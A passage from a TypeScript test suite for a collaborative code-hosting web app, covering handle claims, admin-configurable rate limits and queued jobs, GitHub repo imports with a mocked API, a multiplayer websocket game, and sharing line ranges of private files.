  test("preview deploys, hosted deploys and doctor runs started by hand have rules; reading them doesn't count", () => {
    expect(ruleFor("POST", ["", "repos", "o", "r", "preview"])).toBe("preview");
    expect(ruleFor("POST", ["", "repos", "o", "r", "deps", "run"])).toBe("doctor");
    expect(ruleFor("POST", ["", "repos", "o", "r", "deploy"])).toBe("deploy");
    expect(ruleFor("PUT", ["", "repos", "o", "r", "deploy"])).toBeNull();
    expect(ruleFor("PUT", ["", "repos", "o", "r", "deploy", "key"])).toBeNull();
    expect(ruleFor("GET", ["", "repos", "o", "r", "preview"])).toBeNull();
    expect(ruleFor("PUT", ["", "repos", "o", "r", "deps"])).toBeNull();
  });

  test("a failed send is logged, not shown: the reset answer stays the same", async () => {
    const { call } = await accounts({ EMAIL: { send: async () => { throw Object.assign(new Error("no"), { code: "E_SENDER_NOT_VERIFIED" }); } }, EMAIL_FROM: "accounts@example.com" });
    const err = console.error; console.error = () => {};
    try {
      await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local" },
        body: JSON.stringify({ email: "ana@example.com", password: "correct horse battery", name: "Ana" }) });
      const r = await call(null, "/api/auth/request-password-reset", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local" },
        body: JSON.stringify({ email: "ana@example.com", redirectTo: "/?reset=1" }) });
      expect(r.status).toBe(200);
    } finally { console.error = err; }
  });
});

describe("handles", () => {
  test("six or more characters, free, and not an agent's; an admin gives out short ones by email", async () => {
    const { call, signup, session, claim, person } = await accounts({ ADMINS: "boss-person" });
    const free = async (name: string) => (await (await call(null, `/api/handle?name=${name}`)).json()) as any;
    const boss = await person("boss@example.com", "boss-person");
    expect(await session(boss)).toMatchObject({ user: "boss-person", admin: true });

    const ana = await signup("ana@example.com", "Ana");
    expect((await session(ana)).pick.suggest).toBe("ana-digger");                        // too short to offer
    expect((await claim(ana, "ana")).status).toBe(400);
    expect(await free("ana")).toEqual({ name: "ana", ok: false, why: "at least 6 characters" });
    expect(await free("boss-person")).toMatchObject({ ok: false, why: "taken" });
    expect((await claim(ana, "boss-person")).status).toBe(409);
    expect((await claim(ana, "Ana_Bee")).status).toBe(400);
    expect(await free("agent-codex")).toMatchObject({ ok: false, why: "agent- handles are for coding agents" });
    expect(await free("anabee")).toMatchObject({ ok: true });
    expect((await claim(ana, "anabee")).status).toBe(201);

    const grant = (cookie: string, body: unknown) => call(null, "/api/admin/handles", { method: "POST", headers: { cookie }, body: JSON.stringify(body) });
    expect((await grant(ana, { handle: "zed", email: "zed@example.com" })).status).toBe(403);   // admins only
    expect((await grant(boss, { handle: "boss-person", email: "x@example.com" })).status).toBe(409);
    expect((await grant(boss, { handle: "agent-codex", email: "y@example.com" })).status).toBe(400);
    // A grant goes to a verified email only, since anyone can type one at signup.
    const typed = await signup("zed2@example.com", "Zed");
    const verified = await signup("zed3@example.com", "Zed");
    expect((await grant(boss, { handle: "zed", email: "zed3@example.com" })).status).toBe(201);
    expect(await free("zed")).toMatchObject({ ok: false });
    await call.env.DB.prepare(`UPDATE "user" SET emailVerified = 1 WHERE email = 'zed3@example.com'`).run();
    expect((await session(typed)).user).toBeNull();
    expect((await session(verified)).user).toBe("zed");

    const alias = await local();
    expect((await post(alias, null, "/api/login", { name: "agent-codex" })).status).toBe(400);
  });
});

describe("rate limits", () => {
  const ip = { "cf-connecting-ip": "203.0.113.7" };

  test("count requests from the internet, per IP before sign-in and per handle after", async () => {
    const { call, signup, claim, person } = await accounts({ ADMINS: "boss-person" });
    const boss = await person("boss@example.com", "boss-person");
    // Five accounts an hour from one IP; the desktop and the tests (no cf-connecting-ip) are never counted.
    for (let i = 0; i < 5; i++) await signup(`u${i}@example.com`, `User ${i}`, ip);
    const sixth = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local", ...ip },
      body: JSON.stringify({ email: "u6@example.com", password: "correct horse battery", name: "u6" }) });
    expect(sixth.status).toBe(429);
    expect(Number(sixth.headers.get("retry-after"))).toBeGreaterThan(0);
    expect((await call(null, "/api/search?q=x", { headers: ip })).status).toBe(200);

    // An admin turns the repo limit down to one a day.
    const put = (cookie: string, rules: unknown) => call(null, "/api/admin/limits", { method: "PUT", headers: { cookie }, body: JSON.stringify({ rules }) });
    const ana = await person("ana@example.com", "ana-lyst");
    expect((await put(ana, [])).status).toBe(403);
    expect((await put(boss, [{ name: "repo", max: 0, window_s: 60, enabled: true }])).status).toBe(400);
    expect((await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: true }])).status).toBe(200);
    const repo = (cookie: string, name: string) => call(null, "/api/repos", { method: "POST", headers: { cookie, ...ip }, body: JSON.stringify({ name }) });
    expect((await repo(ana, "one")).status).toBe(201);
    const over = await repo(ana, "two");
    expect(over.status).toBe(429);
    expect(((await over.json()) as any).error).toMatch(/new repos is limited to 1 per day/);
    expect((await repo(boss, "one")).status).toBe(201);                                  // admins aren't limited
    expect((await repo(boss, "two")).status).toBe(201);

    const { rules } = (await (await call(null, "/api/admin/limits", { headers: { cookie: boss } })).json()) as any;
    expect(rules.find((r: any) => r.name === "repo")).toMatchObject({ max: 1, now: { callers: 1, hits: 2, blocked: 1 } });
    expect(rules.find((r: any) => r.name === "signup")).toMatchObject({ max: 5, now: { callers: 1, hits: 6, blocked: 1 } });

    // Switched off, it counts nothing.
    await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: false }]);
    expect((await repo(ana, "three")).status).toBe(201);
    expect((await claim(ana, "nope-nope", ip)).status).toBe(409);
  });

  test("over a limit: reject, log, or flag; the log; and an admin's reset", async () => {
    const { call, person } = await accounts({ ADMINS: "boss-person" });
    const boss = await person("boss@example.com", "boss-person"), ana = await person("ana@example.com", "ana-lyst");
    const put = (rules: unknown) => call(null, "/api/admin/limits", { method: "PUT", headers: { cookie: boss }, body: JSON.stringify({ rules }) });
    const get = async () => (await (await call(null, "/api/admin/limits", { headers: { cookie: boss } })).json()) as any;
    const repo = (name: string) => call(null, "/api/repos", { method: "POST", headers: { cookie: ana, ...ip }, body: JSON.stringify({ name }) });
    expect((await put([{ name: "repo", max: 1, window_s: 86400, enabled: true, on_fail: "shrug" }])).status).toBe(400);

    // Rejected: a 429, and one log entry for the window however many times she tries.
    expect((await get()).rules.find((r: any) => r.name === "repo")).toMatchObject({ on_fail: "reject", group: "Repos", defaults: { on_fail: "reject" } });
    expect((await put([{ name: "repo", max: 1, window_s: 86400, enabled: true }])).status).toBe(200);
    expect((await repo("a")).status).toBe(201);
    expect((await repo("b")).status).toBe(429);
    expect((await repo("c")).status).toBe(429);
    expect((await get()).events.map((e: any) => [e.rule, e.who, e.action])).toEqual([["repo", "@ana-lyst", "reject"]]);

    // An admin resets her: she's back under the cap, and out of the log.
    expect((await call(null, "/api/admin/limits/reset", { method: "POST", headers: { cookie: ana }, body: JSON.stringify({ who: "@ana-lyst" }) })).status).toBe(403);
    expect((await call(null, "/api/admin/limits/reset", { method: "POST", headers: { cookie: boss }, body: JSON.stringify({ who: "@ana-lyst", rule: "repo" }) })).status).toBe(200);
    expect((await get()).events).toEqual([]);
    expect((await repo("d")).status).toBe(201);

    // Logged: let through, noted. Flagged: let through, and listed.
    await put([{ name: "repo", max: 1, window_s: 86400, enabled: true, on_fail: "log" }]);
    expect((await repo("e")).status).toBe(201);
    expect((await get()).flagged).toEqual([]);
    await call(null, "/api/admin/limits/reset", { method: "POST", headers: { cookie: boss }, body: JSON.stringify({ who: "@ana-lyst" }) });
    await put([{ name: "repo", max: 1, window_s: 86400, enabled: true, on_fail: "flag" }]);
    expect((await repo("f")).status).toBe(201);
    expect((await repo("g")).status).toBe(201);
    const { events, flagged } = await get();
    expect(events.map((e: any) => e.action)).toEqual(["flag"]);
    expect(flagged).toMatchObject([{ who: "@ana-lyst", rules: ["repo"], times: 1 }]);
    // A save that leaves on_fail out keeps it.
    await put([{ name: "repo", max: 2, window_s: 86400, enabled: true }]);
    expect((await get()).rules.find((r: any) => r.name === "repo")).toMatchObject({ max: 2, on_fail: "flag" });
  });
  test("over a limit that queues: a place in line, then the dig runs once there's room", async () => {
    const call = await local({ GH_CLI: "off", ADMINS: "boss" });
    const real = globalThis.fetch;
    globalThis.fetch = (async (u: string) => {
      const m = /^\/repos\/([^/]+\/[^/]+)(\/commits\/main)?$/.exec(new URL(u).pathname);
      if (m && m[2]) return Response.json({ sha: "c".repeat(40) });
      if (m) return Response.json({ full_name: m[1], private: false, default_branch: "main" });
      return new Response("{}", { status: 404 });
    }) as any;
    call.artifacts.import = (async (params: any) => call.artifacts.create(params.target.name, { setDefaultBranch: "main" })) as any;
    try {
      for (const u of ["ana", "bo", "boss"]) await post(call, u, "/api/login", { name: u });
      const put = (rules: unknown) => call("boss", "/api/admin/limits", { method: "PUT", body: JSON.stringify({ rules }) });
      const dig = (repo: string) => call("ana", "/api/github/dig", { method: "POST", headers: ip, body: JSON.stringify({ repo }) });
      const job = async (id: number, user = "ana") => (await (await call(user, `/api/jobs/${id}`)).json()) as any;
      const reset = () => call("boss", "/api/admin/limits/reset", { method: "POST", body: JSON.stringify({ who: "@ana", rule: "dig" }) });

      // Only slow, costly jobs can queue.
      expect((await put([{ name: "repo", max: 1, window_s: 86400, enabled: true, on_fail: "queue" }])).status).toBe(400);
      const { rules } = (await (await call("boss", "/api/admin/limits")).json()) as any;
      expect(rules.filter((r: any) => r.queueable).map((r: any) => r.name)).toEqual(["dig", "preview", "doctor"]);
      expect((await put([{ name: "dig", max: 1, window_s: 86400, enabled: true, on_fail: "queue" }])).status).toBe(200);

      // Over the cap: a 202 and a place in line, which holds one window's worth.
      expect((await dig("o/one")).status).toBe(201);
      const second = await dig("o/two");
      expect(second.status).toBe(202);
      const { queued } = (await second.json()) as any;
      expect(queued).toMatchObject({ state: "waiting", place: 1, label: "Dig up a repo" });
      expect(queued.eta).toBeGreaterThan(Date.now());
      expect((await dig("o/three")).status).toBe(429);
      expect((await (await call("boss", "/api/admin/limits")).json() as any).events.map((e: any) => e.action)).toEqual(["queue"]);

      // Polling with no room leaves it waiting; it's hers alone to see.
      expect(await job(queued.id)).toMatchObject({ state: "waiting", place: 1 });
      expect((await call("bo", `/api/jobs/${queued.id}`)).status).toBe(404);
      expect((await call("ana", "/api/repos/ana/two")).status).toBe(404);

      // Room again (an admin's reset, or the window ending): the next poll runs it, as her, taking a slot.
      await reset();
      expect(await job(queued.id)).toMatchObject({ state: "done", status: 201, result: { owner: "ana", name: "two" } });
      expect((await call("ana", "/api/repos/ana/two")).status).toBe(200);
      expect((await call.env.DB.prepare("SELECT count FROM limit_hits WHERE rule = 'dig' AND who = '@ana'").first() as any).count).toBe(1);

      // Nobody polling: the five-minute cron runs it.
      const four = ((await (await dig("o/four")).json()) as any).queued;
      await reset();
      const waits: Promise<unknown>[] = [];
      await worker.scheduled({ cron: "*/5 * * * *" }, call.env, { waitUntil: (w) => waits.push(w) });
      await Promise.all(waits);
      expect(await job(four.id, "boss")).toMatchObject({ state: "done", status: 201 });

      // Back on the page later: her own jobs, newest first, with their place or the repo they made.
      const list = async (user: string | null) => ((await (await call(user, "/api/jobs")).json()) as any).jobs;
      expect((await call(null, "/api/jobs")).status).toBe(401);
      await dig("o/five");
      expect(await list("bo")).toEqual([]);
      let jobs = await list("ana");
      expect(jobs.map((j: any) => [j.what, j.state])).toEqual([["o/five", "waiting"], ["o/four", "done"], ["o/two", "done"]]);
      expect(jobs[0]).toMatchObject({ place: 1, label: "Dig up a repo" });
      expect(jobs[1]).toMatchObject({ status: 201, result: { owner: "ana", name: "four" } });
      // Listing runs what's due, like polling one job does; a job that failed shows why.
      await reset();
      expect((await list("ana"))[0]).toMatchObject({ what: "o/five", state: "done", result: { owner: "ana", name: "five" } });
      const fork = await call("ana", "/api/levels/no-such-level/fork", { method: "POST", headers: ip, body: JSON.stringify({ name: "x" }) });
      expect(fork.status).toBe(202);
      await reset();
      jobs = await list("ana");
      expect(jobs[0]).toMatchObject({ what: "fork of no-such-level", state: "done", result: { error: expect.any(String) } });
      expect(jobs[0].status).toBeGreaterThanOrEqual(400);
    } finally { globalThis.fetch = real; }
  });

  test("live edits count against the edit limit, over the socket and POST alike", async () => {
    // Windows start on the minute; stand the clock still at the start of one so no edit lands in the next.
    setSystemTime(new Date(Math.ceil(Date.now() / 60_000) * 60_000));
    try {
      const call = await local({ ADMINS: "boss" });
      await call.env.DB.prepare("INSERT INTO limit_rules (name, max, window_s, enabled) VALUES ('edit', 3, 60, 1)").run();
      await post(call, "ana", "/api/repos", { name: "r" });
      await post(call, "ana", "/api/repos/ana/r/files", { path: "a", content: "x" });
      const open = async (headers: Record<string, string>) => {
        const ws = ((await call("ana", "/api/repos/ana/r/do/ws?path=a", { headers: { upgrade: "websocket", ...headers } })) as any).webSocket, got: any[] = [];
        ws.toBrowser = (d: string) => got.push(JSON.parse(d));
        ws.queue.splice(0);
        let id = 0;
        const edit = async (text: string) => {
          ws.onMessage(JSON.stringify({ type: "ops", id: ++id, ops: [{ kind: "insert", after: null, text }] }));
          for (const end = performance.now() + 15_000; performance.now() < end;) { const a = got.find((m) => m.id === id); if (a) return a; await Bun.sleep(5); }
        };
        return { edit };
      };
      const sock = await open(ip);
      expect((await sock.edit("1")).type).toBe("ack");
      expect((await sock.edit("2")).type).toBe("ack");
      const ops = (text: string) => call("ana", "/api/repos/ana/r/do/ops?path=a", { method: "POST", headers: ip, body: JSON.stringify({ ops: [{ kind: "insert", after: null, text }] }) });
      expect((await ops("3")).status).toBe(200);
      const over = await sock.edit("4");
      expect(over).toMatchObject({ type: "nack", error: expect.stringMatching(/line edits is limited to 3 per minute/) });
      expect(over.retryAfter).toBeGreaterThan(0);
      expect((await ops("5")).status).toBe(429);
      // The desktop isn't counted, and a page can't name who its socket counts as.
      const desk = await open({ "x-codesplitters-limit-as": "@someone-else" });
      expect((await desk.edit("6")).type).toBe("ack");
      expect(await call.env.DB.prepare("SELECT who FROM limit_hits WHERE rule = 'edit'").all().then((r: any) => r.results.map((x: any) => x.who))).toEqual(["@ana"]);
    } finally { setSystemTime(); }
  });
});

describe("github", () => {
  test("a repo out of anything copied from GitHub", async () => {
    const { parseRepo } = await import("../src/github.ts");
    for (const s of ["honojs/hono", "https://github.com/honojs/hono", "github.com/honojs/hono/", "https://www.github.com/honojs/hono/tree/main/src",
      "https://github.com/honojs/hono/blob/main/src/index.ts#L10", "https://github.com/honojs/hono/pull/12", "git@github.com:honojs/hono.git",
      "ssh://git@github.com/honojs/hono.git", "git clone https://github.com/honojs/hono.git", "git clone --depth 1 git@github.com:honojs/hono.git my-dir",
      "gh repo clone honojs/hono", "https://raw.githubusercontent.com/honojs/hono/main/README.md", "https://github.com/honojs/hono?tab=readme"])
      expect([s, parseRepo(s)]).toEqual([s, "honojs/hono"]);
    for (const s of ["hono", "https://gitlab.com/a/b", "not a repo"]) expect(parseRepo(s)).toBeNull();
  });

  test("search GitHub; a visitor's dig expires in a day, and the oldest goes once too many are live", async () => {
    const call = await local({ GH_CLI: "off", ADMINS: "boss", DIG_CAP: "2" });
    const real = globalThis.fetch, searched: string[] = [];
    globalThis.fetch = (async (u: string) => {
      const url = new URL(u), m = /^\/repos\/([^/]+\/[^/]+)(\/commits\/main)?$/.exec(url.pathname);
      if (url.pathname === "/search/repositories") { searched.push(url.searchParams.get("q")!); return Response.json({ items: [{ full_name: "o/tiny", description: "d", stargazers_count: 5, language: "TS" }] }); }
      if (m && m[2]) return Response.json({ sha: "c".repeat(40) });
      if (m) return Response.json({ full_name: m[1], private: false, default_branch: "main" });
      return new Response("{}", { status: 404 });
    }) as any;
    const deleted: string[] = [];
    call.artifacts.import = (async (params: any) => call.artifacts.create(params.target.name, { setDefaultBranch: "main" })) as any;
    const del = call.artifacts.delete.bind(call.artifacts);
    call.artifacts.delete = (async (n: string) => { deleted.push(n); return del(n); }) as any;
    try {
      for (const u of ["ana", "bo", "boss"]) await post(call, u, "/api/login", { name: u });
      expect(await (await call(null, "/api/github/search?q=tiny")).json()).toEqual({ repos: [{ repo: "o/tiny", description: "d", stars: 5, language: "TS" }] });
      expect(searched).toEqual(["tiny is:public"]);

      const one = (await (await post(call, "ana", "/api/github/dig", { repo: "o/one" })).json()) as any;
      expect(one.expires_at - Date.now()).toBeGreaterThan(23 * 3600_000);
      // Ana opens a file, so evicting it has a Durable Object to wipe.
      await post(call, "ana", "/api/repos/ana/one/files", { path: "a.ts", content: "x\n" });
      await post(call, "bo", "/api/github/dig", { repo: "o/two" });
      expect((await post(call, "boss", "/api/github/dig", { repo: "o/keep" })).status).toBe(201);   // an admin's keeps
      expect((await (await post(call, "boss", "/api/github/dig", { repo: "o/keep", name: "keep-2" })).json() as any).expires_at).toBeUndefined();

      // A third visitor's dig past the cap of two: ana's, the oldest, goes.
      expect((await post(call, "bo", "/api/github/dig", { repo: "o/three" })).status).toBe(201);
      expect(deleted).toEqual(["ana--one"]);
      expect((await call("ana", "/api/repos/ana/one")).status).toBe(404);
      expect(await call.env.DB.prepare("SELECT path FROM files WHERE owner = 'ana'").all()).toMatchObject({ results: [] });
      // And she can dig it up again, fresh.
      await post(call, "ana", "/api/github/dig", { repo: "o/one" });
      expect(((await (await call("ana", "/api/repos/ana/one/do/file?path=a.ts")).json()) as any).error).toBeDefined();

      // Past its day, a dig is gone at once, swept or not.
      await call.env.DB.prepare("UPDATE repos SET expires_at = ? WHERE owner = 'bo' AND name = 'three'").bind(Date.now() - 1).run();
      expect((await call("bo", "/api/repos/bo/three")).status).toBe(404);
      expect((await (await call("bo", "/api/users/bo")).json() as any).repos.map((r: any) => r.name)).toEqual([]);
      expect((await call("boss", "/api/repos/boss/keep")).status).toBe(200);
    } finally { globalThis.fetch = real; }
  });

  test("dig up a GitHub repo: a fork you own, with where it came from", async () => {
    const call = await local({ GH_CLI: "off", GITHUB_TOKEN: "t0k" });
    // GitHub's API, faked; and the import, made local (a real one clones over the network).
    const real = globalThis.fetch, seen: string[] = [];
    globalThis.fetch = (async (u: string, init?: RequestInit) => {
      seen.push(`${u} ${new Headers(init?.headers).get("authorization")}`);
      const path = new URL(u).pathname;
      if (path === "/user") return Response.json({ login: "ana-gh" });
      if (path === "/user/repos") return Response.json([{ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" }, { full_name: "ana-gh/secret", private: true, default_branch: "main" }]);
      if (path === "/repos/ana-gh/Tiny.JS") return Response.json({ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" });
      if (path === "/repos/ana-gh/secret") return Response.json({ full_name: "ana-gh/secret", private: true, default_branch: "main" });
      if (path === "/repos/ana-gh/Tiny.JS/commits/trunk") return Response.json({ sha: "a".repeat(40) });
      if (path === "/repos/ana-gh/secret/commits/main") return Response.json({ sha: "b".repeat(40) });
      return new Response("{}", { status: 404 });
    }) as any;
    const imports: any[] = [];
    call.artifacts.import = (async (params: any) => { imports.push(params); return call.artifacts.create(params.target.name, { setDefaultBranch: params.source.branch }); }) as any;
    try {
      await post(call, "ana", "/api/login", { name: "ana" });
      const list = await (await call("ana", "/api/github/repos")).json() as any;
      expect([list.via, list.login, list.privateOk, list.repos.map((r: any) => [r.repo, r.private])]).toEqual(["secret", "ana-gh", true, [["ana-gh/Tiny.JS", false], ["ana-gh/secret", true]]]);
      expect(seen[0]).toEndWith("Bearer t0k");

      expect((await post(call, null, "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(401);
      expect((await post(call, "ana", "/api/github/dig", { repo: "not a repo" })).status).toBe(400);
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/nope" })).status).toBe(404);
      const dug = await post(call, "ana", "/api/github/dig", { repo: "https://github.com/ana-gh/Tiny.JS.git" });
      expect(dug.status).toBe(201);
      expect(await dug.json()).toEqual({ owner: "ana", name: "tiny-js", upstream: "github:ana-gh/Tiny.JS", commit: "a".repeat(40) });
      expect(imports[0].source).toEqual({ url: "https://github.com/ana-gh/Tiny.JS.git", branch: "trunk", depth: 1 });
      expect(imports[0].target.opts.readOnly).toBeUndefined();   // writable: it's ana's now
      const meta = await (await call("ana", "/api/repos/ana/tiny-js")).json() as any;
      expect([meta.upstream, meta.branch, meta.home, meta.canWrite]).toEqual(["github:ana-gh/Tiny.JS", "trunk", "local", true]);
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(409);

      // Private: local git clones it with the token; the public import never sees one.
      expect(imports[0].source.token).toBeUndefined();
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret" })).status).toBe(201);
      expect(imports[1].source).toEqual({ url: "https://github.com/ana-gh/secret.git", branch: "main", depth: 1, token: "t0k" });
      // Cloudflare Artifacts imports public repos only: say so instead of failing later.
      Object.defineProperty(call.artifacts, "privateImports", { value: false });
      expect((await (await call("ana", "/api/github/repos")).json() as any).privateOk).toBe(false);
      const edge = await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret", name: "secret-2" });
      expect([edge.status, ((await edge.json()) as any).error]).toEqual([422, expect.stringContaining("desktop app")]);
    } finally { globalThis.fetch = real; }
  });
});

describe("game", () => {
  test("a level's backrooms: folders are doors, files are walls, cached by commit", async () => {
    const call = await local();
    const ns = call.artifacts, { push } = await import("../src/git.ts");
    const made = await ns.create("level-mitt");
    await push(made.remote, made.token, { changes: { "README.md": "mitt\n\ttabbed\n", "src/index.ts": "export default 1\nexport function isRecord(x: unknown): x is Record<string, unknown> {\n\treturn typeof x === \"object\" && x !== null;\n}\n", "logo.png": "\u0000png" }, message: "upstream", author: "upstream" });
    const tip = (await (await ns.get("level-mitt")).log())[0]!.hash;
    await call.env.DB.prepare("INSERT INTO levels (slug, status, commit_hash) VALUES ('mitt', 'ready', ?)").bind(tip).run();

    const root = await (await call(null, "/api/game/l/mitt/walls")).json() as any;
    expect(root.doors).toEqual([{ name: "src", path: "src" }]);
    expect(root.files.map((f: any) => [f.name, f.lines])).toEqual([["logo.png", []], ["README.md", ["mitt", "  tabbed", ""]]]);
    const src = (await (await call(null, "/api/game/l/mitt/walls?path=src")).json() as any).files[0];
    expect(src.lines[0]).toBe("export default 1");
    // Its type guard is a noodle monster, sent with its line range.
    expect(src.noodles).toEqual([{ name: "isRecord", start: 2, end: 4, record: true, lines: ["export function isRecord(x: unknown): x is Record<string, unknown> {", "  return typeof x === \"object\" && x !== null;", "}"] }]);
    expect(root.files.every((f: any) => !f.noodles)).toBe(true);
    expect((await call(null, "/api/game/l/mitt/walls?path=nope")).status).toBe(404);
    expect((await call(null, "/api/game/l/clsx/walls")).status).toBe(409);       // not imported
    // A second visit reads D1, not Artifacts.
    expect((await call.env.DB.prepare("SELECT key FROM walls_cache ORDER BY key").all()).results.map((r: any) => r.key)).toEqual([`v2:${tip}:`, `v2:${tip}:src`]);
    // Private repos stay private in the game too.
    await post(call, "ana", "/api/repos", { name: "secret", visibility: "private" });
    expect((await call("bo", "/api/game/r/ana/secret")).status).toBe(404);
    expect((await call("ana", "/api/game/r/ana/secret")).status).toBe(200);
  });

  test("noodles: type guards, isRecord the biggest, with their line ranges", () => {
    const found = noodles([
      "import x from \"y\";",
      "export function isRecord(value: unknown): value is Record<string, unknown> {",
      "  if (typeof value !== \"object\") return false;",
      "  return value !== null;",
      "}",
      "const isFoo = (x: unknown): x is { a: string } =>",
      "  typeof x === \"object\" &&",
      "  x !== null;",
      "export const isBar = <T extends Record<string, unknown>>(x: T | null): x is T => x != null;",
      "function notAGuard(x: unknown): boolean { return true }",
      "function isObj(x: unknown): x is Foo | { b: 1 } {",
      "  return true;",
      "}",
    ].join("\n"));
    expect(found.map((n) => [n.name, n.start, n.end, n.record])).toEqual([["isRecord", 2, 5, true], ["isFoo", 6, 8, false], ["isBar", 9, 9, false], ["isObj", 11, 13, false]]);
    expect(found[1]!.lines).toEqual(["const isFoo = (x: unknown): x is { a: string } =>", "  typeof x === \"object\" &&", "  x !== null;"]);
  });

  test("the room on a level's page: lobby, start, relay, clubbing, round over", async () => {
    const call = await local();
    const join = async (user: string) => {
      const res = await call(user, "/api/game/l/mitt/ws", { headers: { upgrade: "websocket" } }) as any;
      expect(res.status).toBe(101);
      const ws = res.webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    const ana = await join("ana"), bo = await join("bo");
    await Bun.sleep(5);
    expect(ana.last("lobby").players.map((p: any) => p.user)).toEqual(["ana", "bo"]);
    expect(await (await call(null, "/api/game/l/mitt")).json()).toEqual({ state: "waiting", players: ["ana", "bo"] });

    // Both ready: the round starts for both with one seed.
    await ana.say({ t: "ready" });
    expect(ana.last("start")).toBeUndefined();
    await bo.say({ t: "ready" });
    expect(ana.last("start").seed).toBe(bo.last("start").seed);

    const boId = bo.last("lobby").you;
    await ana.say({ t: "pos", p: [1, 0, 2], yaw: 0.5, room: "src", swing: true });
    expect(bo.last("pos")).toMatchObject({ user: "ana", p: [1, 0, 2], room: "src", swing: true });
    expect(ana.last("pos")).toBeUndefined();                                   // not echoed back
    await ana.say({ t: "hit", target: boId, dir: [1, 0] });
    expect(bo.last("bopped")).toEqual({ t: "bopped", by: "ana", dir: [1, 0] });

    await ana.say({ t: "dead", score: 700 });
    expect(ana.last("over")).toBeUndefined();                                  // bo is still up
    await bo.say({ t: "dead", score: 300 });
    expect(ana.last("over").players.map((p: any) => [p.user, p.score])).toEqual([["ana", 700], ["bo", 300]]);
    expect(ana.last("lobby").state).toBe("waiting");

    // Next round: ana goes out, bo's tab goes quiet. Start says why it can't, until bo counts as idle.
    await ana.say({ t: "start" });
    const seed = ana.last("start").seed;
    await ana.say({ t: "dead", score: 50 });
    await ana.say({ t: "start" });
    expect(ana.last("note").text).toContain("bo");
    expect(ana.last("start").seed).toBe(seed);
    const idle = GameRoom.IDLE_MS;
    GameRoom.IDLE_MS = -1;
    try { await ana.say({ t: "start" }); } finally { GameRoom.IDLE_MS = idle; }
    expect(ana.last("start").seed).not.toBe(seed);
    expect(bo.last("start").seed).toBe(ana.last("start").seed);
  });

  test("panic rooms: pick a mode, break pieces for everyone, walk in on the wreckage", async () => {
    const call = await local();
    const join = async (user: string) => {
      const ws = ((await call(user, "/api/game/r/ana/dig/ws", { headers: { upgrade: "websocket" } })) as any).webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    await post(call, "ana", "/api/repos", { name: "dig" });
    const ana = await join("ana"), bo = await join("bo");
    expect(ana.last("lobby").mode).toBe("horde");

    // Removed needs a diff; with one, everyone sees it.
    await ana.say({ t: "mode", mode: "removed" });
    expect(ana.last("note").text).toContain("diff");
    await ana.say({ t: "mode", mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    expect(bo.last("lobby")).toMatchObject({ mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    await bo.say({ t: "mode", mode: "wreck" });
    await bo.say({ t: "start" });
    expect(ana.last("start")).toMatchObject({ mode: "wreck" });
    await ana.say({ t: "mode", mode: "horde" });
    expect(ana.last("note").text).toContain("between rounds");

    // A break goes to the others once, and stays broken for the round.
    await ana.say({ t: "break", id: "src|0|1" });
    await ana.say({ t: "break", id: "src|0|1" });
    expect(bo.got.filter((m) => m.t === "broke")).toEqual([{ t: "broke", id: "src|0|1", by: "ana" }]);
    expect(ana.last("broke")).toBeUndefined();
    const cy = await join("cy");
    expect(cy.last("lobby")).toMatchObject({ state: "playing", mode: "wreck", broken: ["src|0|1"] });

    // Next round starts clean, in the mode picked.
    for (const p of [ana, bo, cy]) await p.say({ t: "dead", score: 10 });
    expect(ana.last("lobby")).toMatchObject({ state: "waiting", mode: "wreck" });
    await ana.say({ t: "start" });
    const late = await join("di");
    expect(late.last("lobby").broken).toEqual([]);
  });
});

describe("shares", () => {
  test("share a few lines of a private repo: live, following the lines, nothing else leaks", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "vault", visibility: "private" });
    await post(call, "ana", "/api/repos/ana/vault/files", { path: "a.ts", content: "one\ntwo\nthree\nfour" });
    const made = await post(call, "ana", "/api/repos/ana/vault/shares", { path: "a.ts", from: 2, to: 3, note: "the good bit" });
    expect(made.status).toBe(201);
    const { id } = await made.json() as any;
    const look = async (who: string | null) => (await (await call(who, `/api/shares/${id}`)).json()) as any;
    expect((await look(null)).lines.map((l: any) => [l.n, l.text])).toEqual([[2, "two"], [3, "three"]]);
    expect((await call("bo", "/api/repos/ana/vault/do/file?path=a.ts")).status).toBe(404);     // the rest stays sealed
    expect((await post(call, "bo", "/api/repos/ana/vault/shares", { path: "a.ts", from: 1, to: 4 })).status).toBe(404);

    // Edits around and inside the range: it follows the lines.
    const doc = await (await call("ana", "/api/repos/ana/vault/do/file?path=a.ts")).json() as any;
    const two = doc.lines[1];
    await post(call, "ana", "/api/repos/ana/vault/do/ops?path=a.ts", { ops: [{ kind: "insert", after: null, text: "zero" }, { kind: "insert", after: two.id, text: "two and a half" }, { kind: "set", line: two.id, base: two.rev, text: "TWO" }] });
    expect((await look("bo")).lines.map((l: any) => [l.n, l.text])).toEqual([[3, "TWO"], [4, "two and a half"], [5, "three"]]);

    expect((await call("bo", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(403);
    expect((await call("ana", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(200);
